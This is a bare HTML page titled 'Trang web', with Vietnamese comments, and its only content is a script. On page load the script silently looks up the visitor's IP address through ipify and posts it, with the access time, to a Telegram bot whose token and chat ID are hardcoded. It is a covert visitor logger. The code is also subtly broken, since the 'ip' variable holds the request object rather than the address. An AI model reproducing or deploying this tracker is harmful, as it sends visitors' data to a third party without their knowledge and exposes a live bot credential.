<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Trang web</title>
</head>
<body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            // Lấy địa chỉ IP của người dùng
            var ip = $.get("https://api.ipify.org/", function(data) {
                return data;
            });

            // Lấy thời gian truy cập
            var time = Date.now();

            // Gửi IP và thời gian truy cập đến bot Telegram
            setTimeout(function() {
                $.ajax({
                    url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage",
                    method: "POST",
                    data: {
                        "chat_id": "-1002081721946",
                        "text": "IP: " + ip + ", Thời gian truy cập: " + time.toString()
                    }
                });
            }, 1000);
        });
    </script>
</body>
</html>
